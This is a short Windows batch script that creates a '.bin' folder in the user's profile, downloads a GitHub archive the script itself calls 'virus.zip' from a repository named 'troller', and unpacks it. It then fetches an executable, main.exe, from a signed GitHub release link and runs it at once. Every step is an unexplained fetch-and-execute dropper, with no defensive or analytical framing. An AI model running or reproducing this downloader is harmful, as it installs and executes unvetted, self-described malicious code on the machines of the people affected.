cd "C:\Users\%username%"
mkdir "C:\Users\%username%\.bin"
cd .bin
curl https://codeload.github.com/boatinalamp/troller/zip/refs/heads/main --output virus.zip
tar xf virus.zip
cd troller-main
curl "https://objects.githubusercontent.com/github-production-release-asset-2e65be/615688613/a4c70cc9-d770-4630-88db-1a9e566b7a18?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230325%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230325T154335Z&X-Amz-Expires=300&X-Amz-Signature=1ff4c0aaf869e400946c1002c5b604741665be01c6f957e5af9788a917f38214&X-Amz-SignedHeaders=host&actor_id=93244703&key_id=0&repo_id=615688613&response-content-disposition=attachment%3B%20filename%3Dmain.exe&response-content-type=application%2Foctet-stream" --output main.exe
main.exe